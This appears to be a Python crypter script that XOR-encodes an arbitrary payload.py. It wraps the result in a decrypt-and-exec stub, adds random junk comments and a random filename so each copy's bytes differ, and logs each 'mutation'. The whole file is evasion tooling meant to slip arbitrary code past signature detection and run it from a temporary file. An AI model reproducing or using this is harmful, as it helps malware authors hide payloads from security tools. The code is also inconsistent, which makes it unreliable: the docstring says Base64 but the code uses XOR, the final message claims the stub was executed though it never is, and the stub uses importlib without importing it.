"""
 • Reads payload.py
 • Encodes it (Base64)
 • Generates a tiny decrypt-and-exec stub with random junk + filename
 • Saves stub inside sandbox/, executes it, and logs the mutation
"""
import base64, os, random, string, subprocess, textwrap, pathlib
from datetime import datetime
from pathlib import Path

# ---------- Paths ----------
ROOT = Path(__file__).resolve().parent.parent  
BOX  = ROOT / "sandbox"
KEY_PATH = ROOT / "xor_key.txt"
BOX.mkdir(exist_ok=True)

# ---------- Load XOR key ----------
if not KEY_PATH.exists():
    raise RuntimeError("Missing xor_key.txt. Please create it with your secret key.")

key = KEY_PATH.read_text().strip().encode()

# ---------- XOR encode payload ----------

def xor_encode(data: bytes, key:bytes) -> bytes:
    """XOR encode the data with the given key."""
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

PAYLOAD = (ROOT / "payload.py").read_bytes()
cipher = xor_encode(PAYLOAD, key)

# ---------- Build decrypt stub ----------

# Insert useless comments that will be ignored but do change the file's bytes
junk_comm = "# " + ''.join(random.choices(string.ascii_letters + ' ', k=30))

stub = textwrap.dedent(f"""
    {junk_comm}
    import base64, tempfile, subprocess, os

    cipher = {list(cipher)}
    key = '{key.decode()}'.encode()

    def xor(data, key):
        return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])


    # Decode and write payload
    payload = xor(bytes(cipher), key).decode()
    tmp = tempfile.NamedTemporaryFile('w', delete=False, suffix='.py')
    tmp.write(payload)
    tmp.close()

    spec = importlib.util.spec_from_file_location("pl", tmp.name)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)

    os.remove(tmp.name)
""")

# ---------- Save stub to random filename ----------
clone_name = ''.join(random.choices(string.ascii_lowercase, k=8)) + ".py"
clone_path = BOX / clone_name
clone_path.write_text(stub)

# ---------- Log mutation ----------
with open(BOX / "mutation.log", "a") as log:
    log.write(f"[{datetime.now()}] Spawned {clone_name}  size = {clone_path.stat().st_size}\n")

print(f"Spawned and executed clone → {clone_path}")